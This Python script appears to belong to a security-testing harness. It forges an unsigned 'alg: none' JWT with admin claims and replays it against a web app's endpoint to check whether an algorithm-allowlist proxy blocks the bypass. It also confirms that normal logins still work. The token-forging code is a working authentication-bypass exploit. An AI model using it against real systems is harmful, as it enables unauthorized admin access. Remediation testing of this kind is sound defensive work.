#!/usr/bin/env python3
"""pt18: an unsigned ("alg": "none") JWT authenticates as admin.

The sibling vulnerability to pt06, same root cause: jsonwebtoken.verify()
is called with no 'algorithms' restriction, so a token whose own header
claims alg: "none" (no signature segment required at all) verifies
successfully, same as pt06's HS256-confusion variant did.

Deliberately reuses pt06's existing algorithm-allowlist proxy rather
than building a new one: that proxy pins to RS256, and "none" isn't
RS256, so it should already block this with zero new code. Point
--target at pt06's proxy (default port 3008) to check that claim
rather than assume it.

Standard library only (urllib, base64, json).
"""

from __future__ import annotations

import argparse
import base64
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt18-001.json"


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _forge_unsigned_token(claims: dict) -> str:
    header = {"alg": "none", "typ": "JWT"}
    payload = {
        "status": "success",
        "data": {
            "id": claims["id"],
            "username": "",
            "email": claims["email"],
            "role": claims["role"],
            "deluxeToken": "",
            "lastLoginIp": "",
            "profileImage": "assets/public/images/uploads/defaultAdmin.png",
            "totpSecret": "",
            "isActive": True,
        },
        "iat": int(time.time()),
    }
    signing_input = f"{_b64url(json.dumps(header, separators=(',', ':')).encode())}.{_b64url(json.dumps(payload, separators=(',', ':')).encode())}"
    return f"{signing_input}."  # empty signature segment: no signature at all


def _get(url: str, token: str) -> tuple[int, dict]:
    req = urllib.request.Request(url, method="GET")
    req.add_header("Cookie", f"token={token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def _register_and_login(target: str) -> tuple[str, str]:
    stamp = str(int(time.time() * 1000))
    email = f"pt18-{stamp}@flatline.test"
    password = "Pt18Pass123!"
    data = json.dumps({"email": email, "password": password, "passwordRepeat": password}).encode()
    req = urllib.request.Request(f"{target}/api/Users", data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    urllib.request.urlopen(req, timeout=10).read()

    login_req = urllib.request.Request(
        f"{target}/rest/user/login",
        data=json.dumps({"email": email, "password": password}).encode(),
        method="POST",
    )
    login_req.add_header("Content-Type", "application/json")
    login_body = json.loads(urllib.request.urlopen(login_req, timeout=10).read())
    return login_body["authentication"]["token"], email


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)

    forged_token = _forge_unsigned_token(blueprint["forged_claims"])
    exploit_status, exploit_body = _get(f"{target}{blueprint['endpoint']}", forged_token)
    exploit_email = exploit_body.get("user", {}).get("email")

    if exploit_status in (401, 403):
        status = "REMEDIATED"
        summary = f"Forged unsigned token blocked with HTTP {exploit_status}."
    elif exploit_status == 200 and exploit_email == blueprint["forged_claims"]["email"]:
        status = "VULNERABLE"
        summary = f"Unsigned ('alg: none') token authenticated as {exploit_email} with no signature at all."
    else:
        status = "ERROR"
        summary = f"Inconclusive: HTTP {exploit_status}, email={exploit_email!r}."

    real_token, real_email = _register_and_login(target)
    legit_status, legit_body = _get(f"{target}{blueprint['endpoint']}", real_token)
    legitimate_real_session_ok = legit_status == 200 and legit_body.get("user", {}).get("email") == real_email

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status,
        "exploit_http_status": exploit_status,
        "summary": summary,
        "legitimate_real_session_ok": legitimate_real_session_ok,
        "legitimate_real_session_http_status": legit_status,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host. Use pt06's proxy (default http://localhost:3008) to check that its existing fix already covers this.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt18-unsigned-jwt", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
